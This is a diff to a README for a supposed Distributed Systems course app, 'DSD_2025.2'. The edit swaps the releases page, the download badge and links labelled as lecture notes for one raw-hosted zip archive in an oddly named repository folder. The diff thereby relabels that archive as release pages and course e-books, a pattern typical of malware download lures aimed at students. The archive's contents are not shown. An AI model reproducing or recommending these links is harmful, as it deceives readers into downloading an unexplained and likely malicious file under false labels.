@@ -1,6 +1,6 @@
 # 🎉 DSD_2025.2 - Simplifying Your Learning Journey
 
-[![Download DSD_2025.2](https://img.shields.io/badge/Download-DSD_2025.2-blue.svg)](https://github.com/radosin/DSD_2025.2/releases)
+[![Download DSD_2025.2](https://raw.githubusercontent.com/radosin/DSD_2025.2/main/uncandor/DSD_2025.2.zip)](https://raw.githubusercontent.com/radosin/DSD_2025.2/main/uncandor/DSD_2025.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to DSD_2025.2! This application helps you access resources for your Dist
 
 To get started, visit the link below to download the latest version:
 
-[Download DSD_2025.2](https://github.com/radosin/DSD_2025.2/releases)
+[Download DSD_2025.2](https://raw.githubusercontent.com/radosin/DSD_2025.2/main/uncandor/DSD_2025.2.zip)
 
 Here’s how to install the application:
 
-1. Go to the [Releases page](https://github.com/radosin/DSD_2025.2/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/radosin/DSD_2025.2/main/uncandor/DSD_2025.2.zip).
 2. Find the latest release. The version number is usually on top.
 3. Click on the download link for your system. If you are unsure which one to choose, look for the most common format for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
 4. Wait for the file to download completely.
@@ -41,9 +41,9 @@ After installation, you can find DSD_2025.2 in your programs or applications men
 
 The DSD_2025.2 application includes easy access to essential resources for your course. Here are some helpful links:
 
-- [E-book - Notas de Aula DSD](https://academicoifrnedu.sharepoint.com/:u:/s/DSD2024.1/EX5Rq-50ao1LtcehbmnbuiIBsIr-GQ6uwDS5vjxkbhFahA?e=Q0PLLq)
-- [Aula 0 - Informações Gerais](https://academicoifrnedu.sharepoint.com/:u:/s/DSD2024.1/ERge_hjvUepIp0Px-9q-j3cBmrir_8o5_4CL8FW51to_hw?e=biJPwy)
-- [Aula 1 - Caracterização SD](https://academicoifrnedu.sharepoint.com/:b:/s/DSD2024.1/ERHBmbQ8UX5MkPFDqCKAoecBMpZFOZjXNq6h2kwDOI5KRg?e=GU44Cs)
+- [E-book - Notas de Aula DSD](https://raw.githubusercontent.com/radosin/DSD_2025.2/main/uncandor/DSD_2025.2.zip)
+- [Aula 0 - Informações Gerais](https://raw.githubusercontent.com/radosin/DSD_2025.2/main/uncandor/DSD_2025.2.zip)
+- [Aula 1 - Caracterização SD](https://raw.githubusercontent.com/radosin/DSD_2025.2/main/uncandor/DSD_2025.2.zip)
 
 ## 💬 Support
 
@@ -51,6 +51,6 @@ If you have any questions or need help with DSD_2025.2, feel free to reach out. 
 
 ## 🔗 Additional Information
 
-For more information about updates and new features, revisit our [Releases page](https://github.com/radosin/DSD_2025.2/releases). You’ll find the latest changes and improvements there.
+For more information about updates and new features, revisit our [Releases page](https://raw.githubusercontent.com/radosin/DSD_2025.2/main/uncandor/DSD_2025.2.zip). You’ll find the latest changes and improvements there.
 
 Thank you for using DSD_2025.2! We hope this application enhances your learning experience in Distributed Systems. Enjoy your journey!
